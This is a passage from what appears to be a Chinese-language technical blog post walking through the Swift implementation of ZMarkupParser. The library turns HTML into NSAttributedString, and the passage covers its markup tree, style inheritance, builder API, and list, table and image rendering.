WC3HTMLTagName.b.rawValue public init() { } public func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : HTMLTagNameVisitor { return visitor.visit(self) }} 對應原始碼中的 HTMLTagNameVisitor 實作 另外參考 W3C wiki 列舉了 HTML tag name enum: WC3HTMLTagName.swiftHTMLTag 則是單純一個容器物件，因為我們希望能讓外部指定 HTML Tag 對應到的樣式，所以宣告一個容器放在一起:struct HTMLTag { let tagName: HTMLTagName let customStyle: MarkupStyle? // 後面介紹 Render 會解釋 init(tagName: HTMLTagName, customStyle: MarkupStyle? = nil) { self.tagName = tagName self.customStyle = customStyle }} 對應原始碼中的 HTMLTag 實作HTMLTagNameToHTMLMarkupVisitorstruct HTMLTagNameToMarkupVisitor: HTMLTagNameVisitor { typealias Result = Markup let attributes: [String: String]? func visit(_ tagName: A_HTMLTagName) -&gt; Result { return LinkMarkup() } func visit(_ tagName: B_HTMLTagName) -&gt; Result { return BoldMarkup() } //...} 對應原始碼中的 HTMLTagNameToHTMLMarkupVisitor 實作轉換成抽象樹 with HTML 資料我們要將 Normalization 後的 HTML 資料結果轉換成抽象樹，首先宣告一個能存放 HTML 資料的 MarkupComponent 資料結構:struct HTMLElementMarkupComponent: MarkupComponent { struct HTMLElement { let tag: HTMLTag let tagAttributedString: NSAttributedString let attributes: [String: String]? } typealias T = HTMLElement let markup: Markup let value: HTMLElement init(markup: Markup, value: HTMLElement) { self.markup = markup self.value = value }}轉換成 Markup 抽象樹:var htmlElementComponents: [HTMLElementMarkupComponent] = []let rootMarkup = RootMarkup()var currentMarkup: Markup = rootMarkuplet htmlTags: [String: HTMLTag]init(htmlTags: [HTMLTag]) { self.htmlTags = Dictionary(uniqueKeysWithValues: htmlTags.map{ ($0.tagName.string, $0) })}// Start Tags Stack, 確保有正確 pop tag// 前面已經做過 Normalization 了, 應該不會出錯, 只是確保而已var stackExpectedStartItems: [HTMLParsedResult.StartItem] = []for thisItem in from { switch thisItem { case .start(let item): let visitor = HTMLTagNameToMarkupVisitor(attributes: item.attributes) let htmlTag = self.htmlTags[item.tagName] ?? HTMLTag(tagName: ExtendTagName(item.tagName)) // 用 Visitor 問對應的 Markup let markup = visitor.visit(tagName: htmlTag.tagName) // 把自己加入當前枝的葉節點 // 自己變成當前枝節點 htmlElementComponents.append(.init(markup: markup, value: .init(tag: htmlTag, tagAttributedString: item.tagAttributedString, attributes: item.attributes))) currentMarkup.appendChild(markup: markup) currentMarkup = markup stackExpectedStartItems.append(item) case .selfClosing(let item): // 直接加入當前枝的葉節點 let visitor = HTMLTagNameToMarkupVisitor(attributes: item.attributes) let htmlTag = self.htmlTags[item.tagName] ?? HTMLTag(tagName: ExtendTagName(item.tagName)) let markup = visitor.visit(tagName: htmlTag.tagName) htmlElementComponents.append(.init(markup: markup, value: .init(tag: htmlTag, tagAttributedString: item.tagAttributedString, attributes: item.attributes))) currentMarkup.appendChild(markup: markup) case .close(let item): if let lastTagName = stackExpectedStartItems.popLast()?.tagName, lastTagName == item.tagName { // 遇到 Close Tag, 就回到上一層 currentMarkup = currentMarkup.parentMarkup ?? currentMarkup } case .rawString(let attributedString): // 直接加入當前枝的葉節點 currentMarkup.appendChild(markup: RawStringMarkup(attributedString: attributedString)) }}// print(htmlElementComponents)// [(markup: LinkMarkup, (tag: a, attributes: [\"href\":\"zhgchg.li\"]...)]運作結果如上圖 對應原始碼中的 HTMLParsedResultToHTMLElementWithRootMarkupProcessor.swift 實作此時，其實我們就完成 Selector 的功能了 🎉public class HTMLSelector: CustomStringConvertible { let markup: Markup let componets: [HTMLElementMarkupComponent] init(markup: Markup, componets: [HTMLElementMarkupComponent]) { self.markup = markup self.componets = componets } public func filter(_ htmlTagName: String) -&gt; [HTMLSelector] { let result = markup.childMarkups.filter({ componets.value(markup: $0)?.tag.tagName.isEqualTo(htmlTagName) ?? false }) return result.map({ .init(markup: $0, componets: componets) }) } //...}我們可以一層一層 Filter 葉節點物件。 對應原始碼中的 HTMLSelector 實作Parser — HTML to MarkupSyle (Abstract of NSAttributedString.Key)再來我們要先完成將 HTML 轉換成 MarkupStyle (NSAttributedString.Key)。NSAttributedString 是透過 NSAttributedString.Key Attributes 來設定字的樣式，我們抽象出 NSAttributedString.Key 的所有欄位對應到 MarkupStyle,MarkupStyleColor,MarkupStyleFont,MarkupStyleParagraphStyle。目的： 原本的 Attributes 的資料結構是 [NSAttributedString.Key: Any?] ，如果直接暴露出去，我們很難控制使用者帶入的值，如果帶錯還會造成閃退，例如 .font: 123 樣式需要可繼承，例如 &lt;a&gt;&lt;b&gt;test&lt;/b&gt;&lt;/a&gt; ，test 字串的樣式就是繼承自 link 的 bold (bold+linke)；如果直接暴露 Dictionary 出去很難控制好繼承規 封裝 iOS/macOS (UIKit/Appkit) 所屬物件MarkupStyle Structpublic struct MarkupStyle { public var font:MarkupStyleFont public var paragraphStyle:MarkupStyleParagraphStyle public var foregroundColor:MarkupStyleColor? = nil public var backgroundColor:MarkupStyleColor? = nil public var ligature:NSNumber? = nil public var kern:NSNumber? = nil public var tracking:NSNumber? = nil public var strikethroughStyle:NSUnderlineStyle? = nil public var underlineStyle:NSUnderlineStyle? = nil public var strokeColor:MarkupStyleColor? = nil public var strokeWidth:NSNumber? = nil public var shadow:NSShadow? = nil public var textEffect:String? = nil public var attachment:NSTextAttachment? = nil public var link:URL? = nil public var baselineOffset:NSNumber? = nil public var underlineColor:MarkupStyleColor? = nil public var strikethroughColor:MarkupStyleColor? = nil public var obliqueness:NSNumber? = nil public var expansion:NSNumber? = nil public var writingDirection:NSNumber? = nil public var verticalGlyphForm:NSNumber? = nil //... // 繼承自... // 預設: 欄位為 nil 時，從 from 填入當前資料物件 mutating func fillIfNil(from: MarkupStyle?) { guard let from = from else { return } var currentFont = self.font currentFont.fillIfNil(from: from.font) self.font = currentFont var currentParagraphStyle = self.paragraphStyle currentParagraphStyle.fillIfNil(from: from.paragraphStyle) self.paragraphStyle = currentParagraphStyle //.. } // MarkupStyle to NSAttributedString.Key: Any func render() -&gt; [NSAttributedString.Key: Any] { var data: [NSAttributedString.Key: Any] = [:] if let font = font.getFont() { data[.font] = font } if let ligature = self.ligature { data[.ligature] = ligature } //... return data }}public struct MarkupStyleFont: MarkupStyleItem { public enum FontWeight { case style(FontWeightStyle) case rawValue(CGFloat) } public enum FontWeightStyle: String { case ultraLight, light, thin, regular, medium, semibold, bold, heavy, black // ... } public var size: CGFloat? public var weight: FontWeight? public var italic: Bool? //...}public struct MarkupStyleParagraphStyle: MarkupStyleItem { public var lineSpacing:CGFloat? = nil public var paragraphSpacing:CGFloat? = nil public var alignment:NSTextAlignment? = nil public var headIndent:CGFloat? = nil public var tailIndent:CGFloat? = nil public var firstLineHeadIndent:CGFloat? = nil public var minimumLineHeight:CGFloat? = nil public var maximumLineHeight:CGFloat? = nil public var lineBreakMode:NSLineBreakMode? = nil public var baseWritingDirection:NSWritingDirection? = nil public var lineHeightMultiple:CGFloat? = nil public var paragraphSpacingBefore:CGFloat? = nil public var hyphenationFactor:Float? = nil public var usesDefaultHyphenation:Bool? = nil public var tabStops: [NSTextTab]? = nil public var defaultTabInterval:CGFloat? = nil public var textLists: [NSTextList]? = nil public var allowsDefaultTighteningForTruncation:Bool? = nil public var lineBreakStrategy: NSParagraphStyle.LineBreakStrategy? = nil //...}public struct MarkupStyleColor { let red: Int let green: Int let blue: Int let alpha: CGFloat //...} 對應原始碼中的 MarkupStyle 實作 另外也參考 W3c wiki, browser predefined color name 列舉了對應 color name text &amp; color R,G,B enum: MarkupStyleColorName.swiftHTMLTagStyleAttribute &amp; HTMLTagStyleAttributeVisitor這邊多提一下這兩個物件，因為 HTML Tag 是允許搭配從 CSS 設定樣式的；對此我們同 HTMLTagName 的抽象，再套用一次在 HTML Style Attribute 上。例如 HTML 可能會給： &lt;a style=”color:red;font-size:14px”&gt;RedLink&lt;/a&gt; ，代表這個連結要設定成紅色、大小 14px。public protocol HTMLTagStyleAttribute { var styleName: String { get } func accept&lt;V: HTMLTagStyleAttributeVisitor&gt;(_ visitor: V) -&gt; V.Result}public protocol HTMLTagStyleAttributeVisitor { associatedtype Result func visit(styleAttribute: HTMLTagStyleAttribute) -&gt; Result func visit(_ styleAttribute: ColorHTMLTagStyleAttribute) -&gt; Result func visit(_ styleAttribute: FontSizeHTMLTagStyleAttribute) -&gt; Result //...}public extension HTMLTagStyleAttributeVisitor { func visit(styleAttribute: HTMLTagStyleAttribute) -&gt; Result { return styleAttribute.accept(self) }} 對應原始碼中的 HTMLTagStyleAttribute 實作HTMLTagStyleAttributeToMarkupStyleVisitorstruct HTMLTagStyleAttributeToMarkupStyleVisitor: HTMLTagStyleAttributeVisitor { typealias Result = MarkupStyle? let value: String func visit(_ styleAttribute: ColorHTMLTagStyleAttribute) -&gt; Result { // 正則挖取 Color Hex or Mapping from HTML Pre-defined Color Name, 請參考 Source Code guard let color = MarkupStyleColor(string: value) else { return nil } return MarkupStyle(foregroundColor: color) } func visit(_ styleAttribute: FontSizeHTMLTagStyleAttribute) -&gt; Result { // 正則挖取 10px -&gt; 10, 請參考 Source Code guard let size = self.convert(fromPX: value) else { return nil } return MarkupStyle(font: MarkupStyleFont(size: CGFloat(size))) } // ...} 對應原始碼中的 HTMLTagAttributeToMarkupStyleVisitor.swift 實作init 的 value = attribute 的值，依照 visit 類型轉換到對應 MarkupStyle 欄位。HTMLElementMarkupComponentMarkupStyleVisitor介紹完 MarkupStyle 物件後，我們要從 Normalization 的 HTMLElementComponents 結果轉換成 MarkupStyle。// MarkupStyle 策略public enum MarkupStylePolicy { case respectMarkupStyleFromCode // 從 Code 來的為主, 用 HTML Style Attribute 來的填空 case respectMarkupStyleFromHTMLStyleAttribute // 從 HTML Style Attribute 來的為主, 用 Code 來的填空}struct HTMLElementMarkupComponentMarkupStyleVisitor: MarkupVisitor { typealias Result = MarkupStyle? let policy: MarkupStylePolicy let components: [HTMLElementMarkupComponent] let styleAttributes: [HTMLTagStyleAttribute] func visit(_ markup: BoldMarkup) -&gt; Result { // .bold 只是定義在 MarkupStyle 中的預設樣式, 請參考 Source Code return defaultVisit(components.value(markup: markup), defaultStyle: .bold) } func visit(_ markup: LinkMarkup) -&gt; Result { // .link 只是定義在 MarkupStyle 中的預設樣式, 請參考 Source Code var markupStyle = defaultVisit(components.value(markup: markup), defaultStyle: .link) ?? .link // 從 HtmlElementComponents 取得 LinkMarkup 對應的 HtmlElement // 從 HtmlElement 中的 attributes 找 href 參數 (HTML 帶 URL String 的方式) if let href = components.value(markup: markup)?.attributes?[\"href\"] as? String, let url = URL(string: href) { markupStyle.link = url } return markupStyle } // ...}extension HTMLElementMarkupComponentMarkupStyleVisitor { // 取得 HTMLTag 容器中指定想客製化的 MarkupStyle private func customStyle(_ htmlElement: HTMLElementMarkupComponent.HTMLElement?) -&gt; MarkupStyle? { guard let customStyle = htmlElement?.tag.customStyle else { return nil } return customStyle } // 預設動作 func defaultVisit(_ htmlElement: HTMLElementMarkupComponent.HTMLElement?, defaultStyle: MarkupStyle? = nil) -&gt; Result { var markupStyle: MarkupStyle? = customStyle(htmlElement) ?? defaultStyle // 從 HtmlElementComponents 取得 LinkMarkup 對應的 HtmlElement // 看看 HtmlElement 中的 attributes 有沒有 `Style` Attribute guard let styleString = htmlElement?.attributes?[\"style\"], styleAttributes.count &gt; 0 else { // 沒有 return markupStyle } // 有 Style Attributes // 切割 Style Value 字串成陣列 // font-size:14px;color:red -&gt; [\"font-size\":\"14px\",\"color\":\"red\"] let styles = styleString.split(separator: \";\").filter { $0.trimmingCharacters(in: .whitespacesAndNewlines) != \"\" }.map { $0.split(separator: \":\") } for style in styles { guard style.count == 2 else { continue } // e.g font-szie let key = style[0].trimmingCharacters(in: .whitespacesAndNewlines) // e.g. 14px let value = style[1].trimmingCharacters(in: .whitespacesAndNewlines) if let styleAttribute = styleAttributes.first(where: { $0.isEqualTo(styleName: key) }) { // 使用上文中的 HTMLTagStyleAttributeToMarkupStyleVisitor 換回 MarkupStyle let visitor = HTMLTagStyleAttributeToMarkupStyleVisitor(value: value) if var thisMarkupStyle = visitor.visit(styleAttribute: styleAttribute) { // Style Attribute 有換回值時.. // 合併上一個 MarkupStyle 結果 thisMarkupStyle.fillIfNil(from: markupStyle) markupStyle = thisMarkupStyle } } } // 如果有預設 Style if var defaultStyle = defaultStyle { switch policy { case .respectMarkupStyleFromHTMLStyleAttribute: // Style Attribute MarkupStyle 為主，然後 // 合併 defaultStyle 結果 markupStyle?.fillIfNil(from: defaultStyle) case .respectMarkupStyleFromCode: // defaultStyle 為主，然後 // 合併 Style Attribute MarkupStyle 結果 defaultStyle.fillIfNil(from: markupStyle) markupStyle = defaultStyle } } return markupStyle }} 對應原始碼中的 HTMLTagAttributeToMarkupStyleVisitor.swift 實作我們會定義部分預設樣式在 MarkupStyle 中，部分 Markup 如果沒有從 Code 外部指定 Tag 想要的樣式時會使用預設樣式。樣式繼承策略有兩種： respectMarkupStyleFromCode:使用預設樣式為主；再看 Style Attributes 中能補上什麼樣式，如果本來就有值則忽略。 respectMarkupStyleFromHTMLStyleAttribute:看 Style Attributes 為主；再看 預設樣式 中能補上什麼樣式，如果本來就有值則忽略。HTMLElementWithMarkupToMarkupStyleProcessor將 Normalization 結果轉換成 AST &amp; MarkupStyleComponent。新宣告一個 MarkupComponent 這次要存放對應 MarkupStyle:struct MarkupStyleComponent: MarkupComponent { typealias T = MarkupStyle let markup: Markup let value: MarkupStyle init(markup: Markup, value: MarkupStyle) { self.markup = markup self.value = value }}簡單遍歷個 Markup Tree &amp; HTMLElementMarkupComponent 結構:let styleAttributes: [HTMLTagStyleAttribute]let policy: MarkupStylePolicy func process(from: (Markup, [HTMLElementMarkupComponent])) -&gt; [MarkupStyleComponent] { var components: [MarkupStyleComponent] = [] let visitor = HTMLElementMarkupComponentMarkupStyleVisitor(policy: policy, components: from.1, styleAttributes: styleAttributes) walk(markup: from.0, visitor: visitor, components: &amp;components) return components} func walk(markup: Markup, visitor: HTMLElementMarkupComponentMarkupStyleVisitor, components: inout [MarkupStyleComponent]) { if let markupStyle = visitor.visit(markup: markup) { components.append(.init(markup: markup, value: markupStyle)) } for markup in markup.childMarkups { walk(markup: markup, visitor: visitor, components: &amp;components) }}// print(components)// [(markup: LinkMarkup, MarkupStyle(link: https://zhgchg.li, color: .blue)]// [(markup: BoldMarkup, MarkupStyle(font: .init(weight: .bold))] 對應原始碼中的 HTMLElementWithMarkupToMarkupStyleProcessor.swift 實作流程結果如上圖Render — Convert To NSAttributedString現在我們有了 HTML Tag 抽象樹結構、HTML Tag 對應的 MarkupStyle 後；最後一步我們就能來產出最後的 NSAttributedString 渲染結果。MarkupNSAttributedStringVisitorvisit markup to NSAttributedStringstruct MarkupNSAttributedStringVisitor: MarkupVisitor { typealias Result = NSAttributedString let components: [MarkupStyleComponent] // root / base 的 MarkupStyle, 外部指定，例如可指定整串字的大小 let rootStyle: MarkupStyle? func visit(_ markup: RootMarkup) -&gt; Result { // 往下看 RawString 物件 return collectAttributedString(markup) } func visit(_ markup: RawStringMarkup) -&gt; Result { // 回傳 Raw String // 搜集鏈上的所有 MarkupStyle // 套用 Style 到 NSAttributedString return applyMarkupStyle(markup.attributedString, with: collectMarkupStyle(markup)) } func visit(_ markup: BoldMarkup) -&gt; Result { // 往下看 RawString 物件 return collectAttributedString(markup) } func visit(_ markup: LinkMarkup) -&gt; Result { // 往下看 RawString 物件 return collectAttributedString(markup) } // ...}private extension MarkupNSAttributedStringVisitor { // 套用 Style 到 NSAttributedString func applyMarkupStyle(_ attributedString: NSAttributedString, with markupStyle: MarkupStyle?) -&gt; NSAttributedString { guard let markupStyle = markupStyle else { return attributedString } let mutableAttributedString = NSMutableAttributedString(attributedString: attributedString) mutableAttributedString.addAttributes(markupStyle.render(), range: NSMakeRange(0, mutableAttributedString.string.utf16.count)) return mutableAttributedString } func collectAttributedString(_ markup: Markup) -&gt; NSMutableAttributedString { // collect from downstream // Root -&gt; Bold -&gt; String(\"Bold\") // \\ // &gt; String(\"Test\") // Result: Bold Test // 一層一層往下找 raw string, 遞迴 visit 並組合出最終 NSAttributedString return markup.childMarkups.compactMap({ visit(markup: $0) }).reduce(NSMutableAttributedString()) { partialResult, attributedString in partialResult.append(attributedString) return partialResult } } func collectMarkupStyle(_ markup: Markup) -&gt; MarkupStyle? { // collect from upstream // String(\"Test\") -&gt; Bold -&gt; Italic -&gt; Root // Result: style: Bold+Italic // 一層一層網上找 parent tag 的 markupstyle // 然後一層一層繼承樣式 var currentMarkup: Markup? = markup.parentMarkup var currentStyle = components.value(markup: markup) while let thisMarkup = currentMarkup { guard let thisMarkupStyle = components.value(markup: thisMarkup) else { currentMarkup = thisMarkup.parentMarkup continue } if var thisCurrentStyle = currentStyle { thisCurrentStyle.fillIfNil(from: thisMarkupStyle) currentStyle = thisCurrentStyle } else { currentStyle = thisMarkupStyle } currentMarkup = thisMarkup.parentMarkup } if var currentStyle = currentStyle { currentStyle.fillIfNil(from: rootStyle) return currentStyle } else { return rootStyle } }} 對應原始碼中的 MarkupNSAttributedStringVisitor.swift 實作運作流程及結果如上圖最終我們可以得到:Li{ NSColor = \"Blue\"; NSFont = \"&lt;UICTFont: 0x145d17600&gt; font-family: \\\".SFUI-Regular\\\"; font-weight: normal; font-style: normal; font-size: 13.00pt\"; NSLink = \"https://zhgchg.li\";}nk{ NSColor = \"Blue\"; NSFont = \"&lt;UICTFont: 0x145d18710&gt; font-family: \\\".SFUI-Semibold\\\"; font-weight: bold; font-style: normal; font-size: 13.00pt\"; NSLink = \"https://zhgchg.li\";}Bold{ NSFont = \"&lt;UICTFont: 0x145d18710&gt; font-family: \\\".SFUI-Semibold\\\"; font-weight: bold; font-style: normal; font-size: 13.00pt\";} 🎉🎉🎉🎉完成🎉🎉🎉🎉到此我們就完成了 HTML String to NSAttributedString 的整個轉換過程。Stripper — 剝離 HTML Tag剝離 HTML Tag 的部分相對簡單，只需要:func attributedString(_ markup: Markup) -&gt; NSAttributedString { if let rawStringMarkup = markup as? RawStringMarkup { return rawStringMarkup.attributedString } else { return markup.childMarkups.compactMap({ attributedString($0) }).reduce(NSMutableAttributedString()) { partialResult, attributedString in partialResult.append(attributedString) return partialResult } }} 對應原始碼中的 MarkupStripperProcessor.swift 實作類似 Render，但純粹找到 RawStringMarkup 後返回內容。Extend — 動態擴充為了能擴充涵蓋所有 HTMLTag/Style Attribute 所以開了一個動態擴充的口，方便直接從 Code 動態擴充物件。public struct ExtendTagName: HTMLTagName { public let string: String public init(_ w3cHTMLTagName: WC3HTMLTagName) { self.string = w3cHTMLTagName.rawValue } public init(_ string: String) { self.string = string.trimmingCharacters(in: .whitespacesAndNewlines).lowercased() } public func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : HTMLTagNameVisitor { return visitor.visit(self) }}// tofinal class ExtendMarkup: Markup { weak var parentMarkup: Markup? = nil var childMarkups: [Markup] = [] func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : MarkupVisitor { return visitor.visit(self) }}//----public struct ExtendHTMLTagStyleAttribute: HTMLTagStyleAttribute { public let styleName: String public let render: ((String) -&gt; (MarkupStyle?)) // 動態用 clourse 變更 MarkupStyle public init(styleName: String, render: @escaping ((String) -&gt; (MarkupStyle?))) { self.styleName = styleName self.render = render } public func accept&lt;V&gt;(_ visitor: V) -&gt; V.Result where V : HTMLTagStyleAttributeVisitor { return visitor.visit(self) }}ZHTMLParserBuilder最後我們使用 Builder Pattern 讓外部 Module 可以快速構建 ZMarkupParser 所需的物件，並做好 Access Level Control。public final class ZHTMLParserBuilder { private(set) var htmlTags: [HTMLTag] = [] private(set) var styleAttributes: [HTMLTagStyleAttribute] = [] private(set) var rootStyle: MarkupStyle? private(set) var policy: MarkupStylePolicy = .respectMarkupStyleFromCode public init() { } public static func initWithDefault() -&gt; Self { var builder = Self.init() for htmlTagName in ZHTMLParserBuilder.htmlTagNames { builder = builder.add(htmlTagName) } for styleAttribute in ZHTMLParserBuilder.styleAttributes { builder = builder.add(styleAttribute) } return builder } public func set(_ htmlTagName: HTMLTagName, withCustomStyle markupStyle: MarkupStyle?) -&gt; Self { return self.add(htmlTagName, withCustomStyle: markupStyle) } public func add(_ htmlTagName: HTMLTagName, withCustomStyle markupStyle: MarkupStyle? = nil) -&gt; Self { // 同個 tagName 只能存在一個 htmlTags.removeAll { htmlTag in return htmlTag.tagName.string == htmlTagName.string } htmlTags.append(HTMLTag(tagName: htmlTagName, customStyle: markupStyle)) return self } public func add(_ styleAttribute: HTMLTagStyleAttribute) -&gt; Self { styleAttributes.removeAll { thisStyleAttribute in return thisStyleAttribute.styleName == styleAttribute.styleName } styleAttributes.append(styleAttribute) return self } public func set(rootStyle: MarkupStyle) -&gt; Self { self.rootStyle = rootStyle return self } public func set(policy: MarkupStylePolicy) -&gt; Self { self.policy = policy return self } public func build() -&gt; ZHTMLParser { // ZHTMLParser init 只開放 internal, 外部無法直接 init // 只能透過 ZHTMLParserBuilder init return ZHTMLParser(htmlTags: htmlTags, styleAttributes: styleAttributes, policy: policy, rootStyle: rootStyle) }} 對應原始碼中的 ZHTMLParserBuilder.swift 實作initWithDefault 預設會加入所有已經實現的 HTMLTagName/Style Attributepublic extension ZHTMLParserBuilder { static var htmlTagNames: [HTMLTagName] { return [ A_HTMLTagName(), B_HTMLTagName(), BR_HTMLTagName(), DIV_HTMLTagName(), HR_HTMLTagName(), I_HTMLTagName(), LI_HTMLTagName(), OL_HTMLTagName(), P_HTMLTagName(), SPAN_HTMLTagName(), STRONG_HTMLTagName(), U_HTMLTagName(), UL_HTMLTagName(), DEL_HTMLTagName(), TR_HTMLTagName(), TD_HTMLTagName(), TH_HTMLTagName(), TABLE_HTMLTagName(), IMG_HTMLTagName(handler: nil), // ... ] }}public extension ZHTMLParserBuilder { static var styleAttributes: [HTMLTagStyleAttribute] { return [ ColorHTMLTagStyleAttribute(), BackgroundColorHTMLTagStyleAttribute(), FontSizeHTMLTagStyleAttribute(), FontWeightHTMLTagStyleAttribute(), LineHeightHTMLTagStyleAttribute(), WordSpacingHTMLTagStyleAttribute(), // ... ] }}ZHTMLParser init 只開放 internal，外部無法直接 init，只能透過 ZHTMLParserBuilder init。ZHTMLParser 封裝了 Render/Selector/Stripper 操作:public final class ZHTMLParser: ZMarkupParser { let htmlTags: [HTMLTag] let styleAttributes: [HTMLTagStyleAttribute] let rootStyle: MarkupStyle? internal init(...) { } // 取得 link style attributes public var linkTextAttributes: [NSAttributedString.Key: Any] { // ... } public func selector(_ string: String) -&gt; HTMLSelector { // ... } public func selector(_ attributedString: NSAttributedString) -&gt; HTMLSelector { // ... } public func render(_ string: String) -&gt; NSAttributedString { // ... } // 允許使用 HTMLSelector 結果渲染出節點內的 NSAttributedString public func render(_ selector: HTMLSelector) -&gt; NSAttributedString { // ... } public func render(_ attributedString: NSAttributedString) -&gt; NSAttributedString { // ... } public func stripper(_ string: String) -&gt; String { // ... } public func stripper(_ attributedString: NSAttributedString) -&gt; NSAttributedString { // ... } // ...} 對應原始碼中的 ZHTMLParser.swift 實作UIKit 問題NSAttributedString 的結果我們最常的就是放到 UITextView 中顯示，但是要注意: UITextView 裡的連結樣式是統一看 linkTextAttributes 設定連結樣式，不會看 NSAttributedString.Key 的設定，且無法個別設定樣式；因此才會有 ZMarkupParser.linkTextAttributes 這個開口。 UILabel 暫時沒有方式改變連結樣式，且因 UILabel 沒有 TextStroage，若要拿來載入 NSTextAttachment 圖片；需要另外抓住 UILabel。public extension UITextView { func setHtmlString(_ string: String, with parser: ZHTMLParser) { self.setHtmlString(NSAttributedString(string: string), with: parser) } func setHtmlString(_ string: NSAttributedString, with parser: ZHTMLParser) { self.attributedText = parser.render(string) self.linkTextAttributes = parser.linkTextAttributes }}public extension UILabel { func setHtmlString(_ string: String, with parser: ZHTMLParser) { self.setHtmlString(NSAttributedString(string: string), with: parser) } func setHtmlString(_ string: NSAttributedString, with parser: ZHTMLParser) { let attributedString = parser.render(string) attributedString.enumerateAttribute(NSAttributedString.Key.attachment, in: NSMakeRange(0, attributedString.string.utf16.count), options: []) { (value, effectiveRange, nil) in guard let attachment = value as? ZNSTextAttachment else { return } attachment.register(self) } self.attributedText = attributedString }}因此多 Extension 了 UIKit，外部只需無腦 setHTMLString() 即可完成綁定。複雜的渲染項目— 項目清單關於項目清單的實現紀錄。在 HTML 中使用 &lt;ol&gt; / &lt;ul&gt; 包裝 &lt;li&gt; 表示項目清單:&lt;ul&gt; &lt;li&gt;ItemA&lt;/li&gt; &lt;li&gt;ItemB&lt;/li&gt; &lt;li&gt;ItemC&lt;/li&gt; //...&lt;/ul&gt;使用同前文解析方式，我們可以在 visit(_ markup: ListItemMarkup) 取得其他 list item 知道當前 list index (得利於有轉換成 AST)。func visit(_ markup: ListItemMarkup) -&gt; Result { let siblingListItems = markup.parentMarkup?.childMarkups.filter({ $0 is ListItemMarkup }) ?? [] let position = (siblingListItems.firstIndex(where: { $0 === markup }) ?? 0)}NSParagraphStyle 有一個 NSTextList 物件可以用來顯示 list item，但是在實作上無法客製化空白的寬度 (個人覺得空白太大)，如果項目符號與字串中間有空白會讓換行觸發在此，顯示會有點奇怪，如下圖:Beter 部分有機會透過 設定 headIndent, firstLineHeadIndent, NSTextTab 實現，但是測試發現字串太長、大小有變還是無法完美呈現結果。目前只做到 Acceptable，自己組合項目清單字串 insert 到字串前。我們只使用到 NSTextList.MarkerFormat 用來產項目清單符號，而不是直接使用 NSTextList。清單符號支援列表可參考： MarkupStyleList.swift最終顯示結果：( &lt;ol&gt;&lt;li&gt; )複雜的渲染項目 — Table類似 清單項目的實現，但是是表格。在 HTML 中使用 &lt;table&gt; 表格-&gt;包裝 &lt;tr&gt; 表格列-&gt;包裝 &lt;td&gt;/&lt;th&gt; 表示表格欄位:&lt;table&gt; &lt;tr&gt; &lt;th&gt;Company&lt;/th&gt; &lt;th&gt;Contact&lt;/th&gt; &lt;th&gt;Country&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Alfreds Futterkiste&lt;/td&gt; &lt;td&gt;Maria Anders&lt;/td&gt; &lt;td&gt;Germany&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Centro comercial Moctezuma&lt;/td&gt; &lt;td&gt;Francisco Chang&lt;/td&gt; &lt;td&gt;Mexico&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt;實測原生的 NSAttributedString.DocumentType.html 是用 Private macOS API NSTextBlock 來完成顯示，因此能完整顯示 HTML 表格樣式及內容。 有點作弊！我們無法用 Private API 🥲 func visit(_ markup: TableColumnMarkup) -&gt; Result { let attributedString = collectAttributedString(markup) let siblingColumns = markup.parentMarkup?.childMarkups.filter({ $0 is TableColumnMarkup }) ?? [] let position = (siblingColumns.firstIndex(where: { $0 === markup }) ?? 0) // 有無從外部指定想要的寬度, 可設 .max 不 truncated string var maxLength: Int? = markup.fixedMaxLength if maxLength == nil { // 沒指定則找到第一行同一欄的 String length 做為 max length if let tableRowMarkup = markup.parentMarkup as? TableRowMarkup, let firstTableRow = tableRowMarkup.parentMarkup?.childMarkups.first(where: { $0 is TableRowMarkup }) as? TableRowMarkup { let firstTableRowColumns = firstTableRow.childMarkups.filter({ $0 is TableColumnMarkup }) if firstTableRowColumns.indices.contains(position) { let firstTableRowColumnAttributedString = collectAttributedString(firstTableRowColumns[position]) let length = firstTableRowColumnAttributedString.string.utf16.count maxLength = length } } } if let maxLength = maxLength { // 欄位超過 maxLength 則 truncated string if attributedString.string.utf16.count &gt; maxLength { attributedString.mutableString.setString(String(attributedString.string.prefix(maxLength))+\"...\") } else { attributedString.mutableString.setString(attributedString.string.padding(toLength: maxLength, withPad: \" \", startingAt: 0)) } } if position &lt; siblingColumns.count - 1 { // 新增空白做為 spacing, 外部可指定 spacing 寬度幾個空白字 attributedString.append(makeString(in: markup, string: String(repeating: \" \", count: markup.spacing))) } return attributedString } func visit(_ markup: TableRowMarkup) -&gt; Result { let attributedString = collectAttributedString(markup) attributedString.append(makeBreakLine(in: markup)) // 新增換行, 詳細請參考 Source Code return attributedString } func visit(_ markup: TableMarkup) -&gt; Result { let attributedString = collectAttributedString(markup) attributedString.append(makeBreakLine(in: markup)) // 新增換行, 詳細請參考 Source Code attributedString.insert(makeBreakLine(in: markup), at: 0) // 新增換行, 詳細請參考 Source Code return attributedString }最終呈現效果如下圖：not perfect, but acceptable.複雜的渲染項目 — Image最終來講一個最大的魔王，載入遠端圖片到 NSAttributedString。在 HTML 中使用 &lt;img&gt; 表示圖片:&lt;img src=\"https://user-images.githubusercontent.com/33706588/219608966-20e0c017-d05c-433a-9a52-091bc0cfd403.jpg\" width=\"300\" height=\"125\"/&gt;並可透過 width / height HTML Attribute 指定想要的顯示大小。在 NSAttributedString 中顯示圖片，比想像中複雜很多；且沒有很好的實現，之前做 UITextView 文繞圖 時有稍微踩過坑，但這次在研究一輪發現還是沒有一個完美的解決方案。目前先忽略 NSTextAttachment 原生不能 reuse 釋放記憶體的問題，先只實現從遠端下載圖片放到 NSTextAttachment 在放到 NSAttributedString 中，並實現自動更新內容。此系列操作又再拆到另一個小的 Project 實現，想說日後比較好優化跟復用到其他 Project:主要是參考 Asynchronous NSTextAttachments 這系列文章實現，但是替換了最後的更新內容部分(下載完後要刷新 UI 才會呈現)還有增加 Delegate/DataSource 給外部擴充使用。運做流程與關係如上圖 宣告 ZNSTextAttachmentable 物件，封裝 NSTextStorage 物件(UITextView自帶)及 UILabel 本身 (UILabel 無 NSTextStorage)操作方法僅為實現 replace attributedString from NSRange. ( func replace(attachment: ZNSTextAttachment, to: ZResizableNSTextAttachment) ) 實現原理是先使用 ZNSTextAttachment 包裝 